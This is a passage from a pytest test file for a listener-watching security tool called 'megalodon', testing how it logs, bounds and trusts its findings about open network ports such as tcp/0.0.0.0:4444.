    listeners = view(build(), "listeners")
    assert len(listeners["findings"]) == 1 and listeners["finding_count"] == 1


def test_a_check_that_fails_does_not_erase_what_the_watch_saw(home, monkeypatch):
    from megalodon import listener_watch
    _keeper()(_seen(4444))

    def broken(*a, **k):
        raise listener_watch.ListenerError("the listener baseline cannot be read")
    monkeypatch.setattr(listener_watch, "check", broken)
    assert run_cli(["listeners", "check"]) == 2
    monkeypatch.setattr(listener_watch, "check", lambda *a, **k: dict(findings=[], gaps=[]))
    run_cli(["listeners", "check"])
    assert [f["where"] for f in view(build(), "listeners")["findings"]] == ["tcp/0.0.0.0:4444"]


def test_what_the_watch_saw_is_appended_never_rewritten(home):
    # A check runs while the watch appends: the watch's log is its own file, written by appending one line.
    _keeper()(_seen(1))
    keep("listeners", [])
    _keeper()(_seen(2))
    path = results.seen_path("listeners")
    assert path.stat().st_mode & 0o777 == 0o600 and len(path.read_text().splitlines()) == 2
    assert not (Path(results.DEFAULT_FOLDER).expanduser() / "listeners.json").read_text().count("4444")


def test_the_watches_kept_are_one_list():
    from megalodon import cli
    assert tuple(cli.WATCHES_KEPT) == tuple(results.SEEN_CHECKS)


def test_a_flood_of_watch_findings_is_bounded_and_still_counted(home, monkeypatch):
    # Past half the bound only severities are added (still counted); past the bound nothing (the count says so).
    monkeypatch.setattr(results, "MAX_SEEN_BYTES", 4000)
    monkeypatch.setattr(results, "_SEEN_FULL", 2000)
    kept = _keeper()
    for n in range(200):
        kept(_seen(n, "HIGH" if n == 199 else "LOW"))
    log = results.seen("listeners")
    assert results.seen_path("listeners").stat().st_size < 4000 + 200
    assert all(isinstance(f, dict) and "listener" in f for f in log["findings"])
    assert log["at_least"] and log["total"] < 200 and log["total"] > len(log["findings"])
    listeners = view(build(), "listeners")
    assert listeners["status_text"].startswith("at least ") and listeners["not_kept"] > 0


def test_the_latest_watch_findings_are_the_ones_kept(home):
    kept = _keeper()
    for n in range(results.MAX_FINDINGS + 3):
        kept(_seen(n))
    log = results.seen("listeners")
    assert log["findings"][0]["listener"] == "tcp/0.0.0.0:3" and log["findings"][-1]["listener"].endswith(
        f":{results.MAX_FINDINGS + 2}")


def test_what_the_watch_saw_shows_beside_an_untrusted_check_result(home):
    _keeper()(_seen(4444))
    path = keep("listeners", [])
    os.chmod(path, 0o644)
    listeners = view(build(), "listeners")
    assert listeners["findings"][0]["where"] == "tcp/0.0.0.0:4444" and "cannot be trusted" in listeners["problem"]


def test_a_watch_log_others_could_write_is_not_trusted(home):
    _keeper()(_seen(4444))
    os.chmod(results.seen_path("listeners"), 0o644)
    listeners = view(build(), "listeners")
    assert listeners["findings"] == [] and "cannot be read" in listeners["problem"]
    with pytest.raises(results.ResultError):
        results.add_seen("listeners", _seen(1))
